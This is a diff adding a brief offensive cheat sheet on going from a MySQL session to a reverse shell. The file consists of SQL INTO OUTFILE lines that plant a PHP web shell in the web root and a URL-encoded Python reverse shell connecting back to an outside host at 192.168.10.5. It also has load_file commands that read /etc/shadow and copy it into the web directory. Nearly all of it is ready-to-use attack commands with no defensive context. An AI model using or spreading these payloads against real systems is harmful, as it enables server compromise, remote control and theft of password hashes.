@@ -1,0 +1,15 @@
+# From mysql session to reverse shell
+
+select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/shell.php';
+select "<?php shell_exec($_GET['cmd']); ?>" into outfile '/var/www/shell.php';
+select "<?php passthru($_GET['cmd']); ?>" into outfile '/var/www/shell.php';
+
+http://192.168.10.6/index.php?cmd=python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.5",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+# Read and write files from a MySQL session
+--> Privileges depend on the user executing mysql server
+select load_file('/etc/password');
+select load_file('/etc/shadow') into outfile '/var/www/shadow';
+
+
